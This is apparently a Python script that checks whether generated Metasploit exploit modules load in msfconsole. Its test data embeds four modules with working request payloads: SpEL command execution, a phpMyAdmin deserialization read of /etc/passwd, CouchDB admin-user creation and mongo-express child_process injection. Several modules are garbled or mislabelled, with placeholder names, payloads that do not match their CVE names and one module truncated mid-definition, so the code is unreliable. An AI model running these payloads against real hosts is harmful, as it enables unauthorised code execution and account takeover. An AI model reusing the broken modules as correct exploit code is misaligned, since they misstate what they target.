import re
import os
from pathlib import Path
import re
import subprocess
import pexpect
import time


# 文件处理
class File:
    def __init__(self, ruby):
        self.ruby = ruby
        base_dir = Path(os.getenv("VERIFY_WORK_DIR", Path(__file__).resolve().parent))
        self.ruby_path = str(base_dir / 'check2' / 'msf' / 'mods' / 'exploits' / 'misc')
        self.load_path = str(base_dir / 'check2' / 'msf' / 'mods')
        self.create_dir()
        self.clean_env()
        self.create_ruby()

    # 清空Load路径
    def clean_env(self):
        os.system(f"rm  {self.ruby_path}/*.rb")
    
    # 创建工作目录
    def create_dir(self): 
        print(self.ruby_path)
        if not os.path.exists(self.ruby_path):
            os.makedirs(self.ruby_path)

    # 创建本地ruby
    def create_ruby(self):
        with open(os.path.join(self.ruby_path,self.ruby.name), 'w', encoding='utf-8') as file:
            file.writelines(self.ruby.content)
        file.close()


# ruby配置
class Ruby:
    def __init__(self, name, content, model='0', port='8080', ip=''):
        self.name = name
        self.content = content
        self.model = model
        self.level = 0
        self.port = port
        self.message = ""
        self.ip = ip

# 验证器
class Verify:
    def __init__(self, ruby, mode):
        self.ruby = ruby
        self.file = File(self.ruby)
        self.mode = mode
        
    # 验证ruby函数是否为空
    def check_empty_functions(self):
        with open(os.path.join(self.file.ruby_path, self.ruby.name), 'r', encoding='utf-8') as file:
            content = file.read()
        function_pattern = re.compile(r'def\s+([a-zA-Z_][a-zA-Z0-9_]*(?:\(.*?\))?)(.+?)end', re.DOTALL)
        functions = function_pattern.finditer(content)
        empty_functions = []
        for match in functions:
            func_name = match.group(1).strip()
            func_body = match.group(2).strip()
            # 计算函数开始的行号
            line_number = content[:match.start()].count('\n') + 1
            # 检查函数体是否为空
            # 空函数体可能包含注释或只有空格
            code_lines = [line.strip() for line in func_body.split('\n')]
            actual_code_lines = [line for line in code_lines if line and not line.startswith('#')]
            if not actual_code_lines:
                empty_functions.append((func_name, line_number))
        if empty_functions:
            print(f"发现 {len(empty_functions)} 个空函数:")
            print("函数名：行号")
            for func_name, line_number in empty_functions:
                print(f"{func_name}: {line_number}")
                self.ruby.message = self.ruby.message + f"{str(func_name)}函数为空，重新生成"
            self.ruby.level = 3
            return True
        else:
            print(f"没有发现空函数")
            return False

    # 验证ruby是否为4
    def verify_ruby(self):
        # 上传msf配置 /tmp/data/config
        self.check_empty_functions()
        msf_process = pexpect.spawn('msfconsole')
        msf_process.expect('> ', timeout=300)
        time.sleep(3)
        msf_process.sendline(f"loadpath {self.file.load_path}")
        msf_process.expect('modules:', timeout=300)
        load_output = msf_process.before.decode()

        if "Loaded 0" in load_output:
            self.ruby.level = 3
            self.ruby.message = self.ruby.message + load_output + "msf加载失败"
        elif "Loaded 1" in load_output:
            self.ruby.level = 4
        else:
            self.ruby.message = self.ruby.message + load_output + "msf加载失败"
        # 输出结果
        self.print_result()
        return self.ruby

    # 输出结果
    def print_result(self):
        print(self.ruby.name, '---------------------', self.ruby.level)
        print(self.ruby.message)


if __name__ == '__main__':
    # 测试用例
    out = [
        {
            "name": "http_activemq_cve_2016_3088",
            "content": "require 'msf/core'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Your Exploit Name',\n      'Description'    => %q{\n        This module exploits a vulnerability in the target application.\n        By sending a specially crafted request, an attacker can execute arbitrary commands on the system.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'Your Name' ],\n      'References'     =>\n        [\n          [ 'URL', '<url id=\"cvdnvp13om1g61i4tpc0\" type=\"url\" status=\"failed\" title=\"\" wc=\"0\"><url id=\"cvdo0n64bbjivfb7euv0\" type=\"url\" status=\"waiting\" title=\"\" wc=\"0\">http://example.com/your-exploit</url> </url> ' ]\n        ],\n      'Platform'       => 'unix',\n      'Targets'        =>\n        [\n          [ 'Automatic Target', { } ]\n        ],\n      'DisclosureDate' => 'Your Disclosure Date',\n      'DefaultTarget'  => 0))\n  end\n\n  def exploit\n    # Construct the payload\n    payload = \"T(java.lang.Runtime).getRuntime().exec('touch /tmp/success')\"\n\n    # Send the payload\n    send_request_cgi({\n      'uri'    => '/your-vulnerable-endpoint',\n      'method' => 'POST',\n      'ctype'  => 'application/json',\n      'data'   => payload.to_json\n    })\n  end\nend",
            "model": "1",
            "ip": "127.0.0.1",
            "urlcode": 200,
            "port": 8080
        },
        {
            "name": "http_apachedruid_cve_2021_25646",
            "content": "require 'msf/core'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'phpMyAdmin Setup Script Deserialization Vulnerability',\n      'Description'    => %q{\n        This module exploits a deserialization vulnerability in phpMyAdmin's setup script.\n        By sending a specially crafted POST request, an attacker can read arbitrary files\n        or execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'Your Name' ],\n      'References'     =>\n        [\n          [ 'URL', 'http://your-reference-url' ]\n        ],\n      'Platform'       => 'php',\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ]\n        ],\n      'DisclosureDate' => 'Your Disclosure Date',\n      'DefaultTarget'  => 0))\n  end\n\n  def exploit\n    payload = \"action=test&configuration=O:10:\\\"PMA_Config\\\":1:{s:6:\\\"source\\\",s:11:\\\"/etc/passwd\\\";}\"\n\n    send_request_cgi({\n      'uri'    => '/scripts/setup.php',\n      'method' => 'POST',\n      'ctype'  => 'application/x-www-form-urlencoded',\n      'data'   => payload\n    })\n  end\nend",
            "model": "3",
            "ip": "100.88.53.125",
            "urlcode": 200,
            "port": 8080
        },
        {
            "name": "http_couchdb_cve_2017_12635",
            "content": "require 'msf/core'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'CouchDB User Role Privilege Bypass',\n      'Description'    => %q{\n        This module exploits a vulnerability in CouchDB that allows for the creation of\n        an administrator account via a crafted PUT request to the _users endpoint.\n        The vulnerability is due to improper handling of JSON objects, which leads to\n        a privilege escalation from user to administrator.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'Your Name' ],\n      'References'     =>\n        [\n          [ 'CVE', '2017-12635' ],\n          [ 'URL', '<url id=\"cvdo0n64bbjivfb7euvg\" type=\"url\" status=\"parsed\" title=\"Vulhub - Pre-Built Vulnerable Environments\" wc=\"2204\">https://vulhub.org/#/exploit/couchdb-user-priv-esc</url> ' ]\n        ],\n      'Platform'       => 'ruby',\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ]\n        ],\n      'DisclosureDate' => '2017-09-13',\n      'DefaultTarget'  => 0))\n  end\n\n  def exploit\n    payload = {\n      'type' => 'user',\n      'name' => 'vulhub',\n      'roles' => ['_admin'],\n      'roles' => [],\n      'password' => 'vulhub'\n    }\n\n    send_request_cgi({\n      'uri'    => '/_users/org.couchdb.user:vulhub',\n      'method' => 'PUT',\n      'ctype'  => 'application/json',\n      'data'   => payload.to_json\n    })\n  end\nend",
            "model": "3",
            "ip": "127.0.0.1",
            "urlcode": 200,
            "port": 5984
        },
        {"name": "http_mongo_express_cve_2019_10758", "content": "require 'msf/core'\nMD,\n      'Targets'        =>\n        [\n          ['Automatic', { }]\n        ],\n      'DisclosureDate' => '2019-04-09',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(8080)\n      ])\n  end\n\n  def exploit\n    connect\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => '/checkValid',\n      'headers' =>\n        {\n          'Authorization' => 'Basic YWRtaW46cGFzcw==',\n          'Content-Type' => 'application/x-www-form-urlencoded',\n          'Content-Length' => '124'\n        },\n      'data' => 'document=this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"touch /tmp/success\")'\n    })\n\n    if res && res.code == 200\n      print_good('Successfully executed command')\n    else\n      print_error('Failed to execute command')\n    end\n\n    print_status(\"Response: #{res.body}\")\n  end\nend", "model": "1", "ip": "127.0.0.1", "port": "8081"}
    ]

    for i in range(4):
        print(i, out[i]['name'])
        test_ruby = Ruby(name = out[i]['name'] + '.rb', content = out[i]['content'], model = out[i]['model'], port = out[i]['port'], ip= out[i]['ip'])
        # 验证模块
        verify = Verify(test_ruby, mode=0)
        # 验证ruby
        verify.verify_ruby()
    

